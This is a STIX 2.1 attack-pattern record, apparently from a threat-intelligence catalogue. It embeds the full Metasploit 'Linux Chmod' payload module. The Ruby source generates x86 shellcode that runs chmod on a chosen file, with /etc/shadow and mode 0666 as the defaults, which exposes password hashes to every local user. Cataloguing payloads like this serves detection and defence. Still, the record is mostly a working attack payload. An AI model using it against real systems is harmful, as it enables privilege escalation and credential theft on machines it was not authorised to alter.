{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0153a4bf-3a47-4736-8e76-3eef476e8479",
    "created": "2024-08-14T16:33:19.433528Z",
    "modified": "2024-08-14T16:33:19.433532Z",
    "name": "Linux Chmod",
    "description": "Runs chmod on specified file with specified mode",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/x86/chmod.rb",
            "external_id": "chmod.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n###\n#  Linux Chmod(file, mode)\n#\n#  Kris Katterjohn - 03/03/2008\n###\nmodule MetasploitModule\n\n  CachedSize = 36\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'        => 'Linux Chmod',\n      'Description' => 'Runs chmod on specified file with specified mode',\n      'Author'      => 'kris katterjohn',\n      'License'     => BSD_LICENSE,\n      'Platform'    => 'linux',\n      'Arch'        => ARCH_X86))\n\n    register_options(\n      [\n        OptString.new('FILE', [ true, \"Filename to chmod\", \"/etc/shadow\" ]),\n        OptString.new('MODE', [ true, \"File mode (octal)\", \"0666\" ]),\n      ])\n  end\n\n  # Dynamically generates chmod(FILE, MODE) + exit()\n  def generate(opts={})\n    file    = datastore['FILE'] || '/etc/shadow'\n    mode\t= (datastore['MODE'] || \"0666\").oct\n\n    payload\t=\n      \"\\x99\\x6a\\x0f\\x58\\x52\" +\n      Rex::Arch::X86.call(file.length + 1) + file + \"\\x00\" +\n      \"\\x5b\" + Rex::Arch::X86.push_dword(mode) +\n      \"\\x59\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80\";\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}